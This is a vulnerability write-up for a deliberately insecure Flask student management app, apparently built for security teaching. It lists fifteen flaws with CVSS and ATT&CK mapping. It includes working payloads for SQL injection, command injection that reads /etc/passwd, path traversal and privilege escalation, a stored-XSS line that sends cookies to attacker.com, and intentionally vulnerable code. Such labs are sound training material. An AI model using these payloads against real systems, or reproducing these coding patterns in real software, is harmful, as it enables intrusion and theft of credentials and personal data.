# Phase 2 – Vulnerable SMS: Vulnerability Documentation

## System Overview

| Attribute | Value |
|---|---|
| Framework | Python 3 + Flask |
| Database | SQLite (via sqlite3, no ORM) |
| Auth | Session-based (server-side session + client cookie) |
| Port | 5000 (debug mode ON) |

## How to Run

```bash
pip install flask
python3 app.py
# Visit: http://127.0.0.1:5000
```

**Default Accounts:**

| Username | Password | Role |
|---|---|---|
| admin | admin123 | admin |
| john.smith | password1 | student |
| jane.doe | jane2024 | student |
| prof.kumar | faculty99 | faculty |
| alice.wang | alice123 | student |

---

## Vulnerabilities Index

### VULN-01 · Brute Force / Credential Stuffing
**STRIDE: Spoofing | CVSS: 7.5 (High)**

- Route: `POST /login`
- No account lockout after failed attempts
- No CAPTCHA or rate limiting
- No IP-based throttling
- Exploit: Run `hydra` or `ffuf` with a wordlist — unlimited attempts allowed

---

### VULN-02 · SQL Injection
**STRIDE: Tampering, Information Disclosure | CVSS: 9.8 (Critical)**

- Routes: `POST /login`, `GET /search`
- Raw f-string query concatenation, zero parameterization
- Login bypass: `' OR '1'='1`
- Data extraction: `' UNION SELECT id,username,password,role,email,full_name,null,null,null,null FROM users--`

```python
# Vulnerable code (app.py ~line 98)
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
```

---

### VULN-03 · Insecure File Upload
**STRIDE: Tampering, Elevation of Privilege | CVSS: 9.0 (Critical)**

- Route: `POST /upload`
- No file type whitelist (`.php`, `.py`, `.sh` all accepted)
- No MIME type validation
- No antivirus scanning
- Original filename used on disk (no randomization)
- Full server path disclosed in success message

---

### VULN-04 · Broken Authentication (Weak Passwords + Plain-Text Storage)
**STRIDE: Spoofing | CVSS: 7.5 (High)**

- Passwords stored as plain text in SQLite
- No password complexity requirements
- No bcrypt/hashing used
- Passwords visible in DB, admin panel, profile pages, and API

---

### VULN-05 · Privilege Escalation / IDOR
**STRIDE: Elevation of Privilege | CVSS: 8.8 (High)**

- Routes: `GET /dashboard`, `GET /admin`, `GET /student/<id>`
- URL parameter `?role=admin` overrides and persists role in session
- Student profile accessible by any logged-in user (IDOR)
- No server-side RBAC enforcement

```
# Privilege escalation:
GET /dashboard?role=admin
# IDOR:
GET /student/1  (accessible by any user)
```

---

### VULN-06 · Session Hijacking (Missing Cookie Flags)
**STRIDE: Spoofing | CVSS: 7.1 (High)**

- `sms_session` cookie set without `HttpOnly` or `Secure` flags
- Weak secret key: `sms123` (short, hardcoded, guessable)
- Cookie accessible via JavaScript → XSS can steal it

---

### VULN-07 · Sensitive Data Exposure
**STRIDE: Information Disclosure | CVSS: 7.5 (High)**

- Plain-text passwords visible in: admin panel, student profiles, search results, API
- National IDs, financial aid data, DOB displayed to all logged-in users
- `GET /api/students` requires no authentication and returns complete PII dump

---

### VULN-08 · Information Disclosure (Verbose Errors)
**STRIDE: Information Disclosure | CVSS: 5.3 (Medium)**

- Routes: all error conditions, search endpoint
- Raw SQL queries shown on error
- Full Python stack traces returned to browser (debug=True)
- Username existence oracle on login failure
- Full server file paths disclosed in upload success message

---

### VULN-09 · Log Injection / No Log Integrity
**STRIDE: Repudiation | CVSS: 6.5 (Medium)**

- User-controlled input written directly to log file
- `POST /admin/logs/inject` — forged entries accepted without validation
- `POST /admin/logs/clear` — entire log file can be wiped
- No log signing, checksumming, or remote shipping

---

### VULN-10 · Command Injection
**STRIDE: Tampering, Elevation of Privilege | CVSS: 9.0 (Critical)**

- Route: `POST /admin/diagnostics`
- User-supplied `host` parameter concatenated into shell command
- `shell=True` used in `subprocess.check_output`

```python
# Vulnerable code
cmd = f"ping -c 2 {host}"
output = subprocess.check_output(cmd, shell=True, ...)
```

Payload: `127.0.0.1; cat /etc/passwd`

---

### VULN-11 · Path Traversal
**STRIDE: Information Disclosure | CVSS: 7.5 (High)**

- Route: `GET /download?file=<filename>`
- No path sanitization — `../` sequences not stripped
- `GET /download?file=../../etc/passwd` reads system files
- `GET /download?file=../sms.db` downloads the entire database

---

### VULN-12 · Parameter Tampering
**STRIDE: Tampering | CVSS: 7.1 (High)**

- Routes: `POST /profile/update`, `POST /grade/update`
- `user_id` accepted from hidden form field instead of session
- Any user can update any other user's profile by changing `user_id` in form
- No CSRF protection

---

### VULN-13 · Stored XSS
**STRIDE: Spoofing, Information Disclosure | CVSS: 6.1 (Medium)**

- Routes: student profile, dashboard, search results
- `full_name` and `address` rendered with `| safe` Jinja filter — no HTML escaping
- Payload: `<script>document.location='http://attacker.com?c='+document.cookie</script>` in name field
- Cookie theft enabled by VULN-06 (no HttpOnly flag)

---

### VULN-14 · Business Logic Flaw (Unauthorized Grade Modification)
**STRIDE: Tampering | CVSS: 7.5 (High)**

- Route: `POST /grade/update`
- No role check — any authenticated user (including students) can modify any grade
- No audit trail or approval workflow

---

### VULN-15 · DoS via Login Flooding
**STRIDE: Denial of Service | CVSS: 5.3 (Medium)**

- Route: `POST /login`
- No rate limiting, no request throttling
- No async handling — synchronous DB queries per request
- Flood with concurrent requests → service unavailability

---

## MITRE ATT&CK Mapping Summary

| Stage | Tactic | Vulnerability | CVSS |
|---|---|---|---|
| 1 | Reconnaissance | VULN-08 (Verbose Errors) | 5.3 |
| 2 | Initial Access | VULN-01 (Brute Force) + VULN-02 (SQLi Login) | 7.5 / 9.8 |
| 3 | Execution | VULN-02 (SQL Injection) | 9.8 |
| 4 | Persistence | VULN-03 (File Upload) | 9.0 |
| 5 | Privilege Escalation | VULN-05 (IDOR/Param Tamper) | 8.8 |
| 6 | Defense Evasion | VULN-09 (Log Injection/Clear) | 6.5 |
| 7 | Credential Access | VULN-13 (XSS) + VULN-06 (No HttpOnly) | 7.1 |
| 8 | Collection | VULN-07 (Data Exposure) | 7.5 |
| 9 | Exfiltration | VULN-11 (Path Traversal) + VULN-07 (API) | 7.5 |
| 10 | Impact | VULN-14 (Grade Tamper) + VULN-15 (DoS) | 9.1 |

---

*For educational purposes only. Do not deploy in production.*
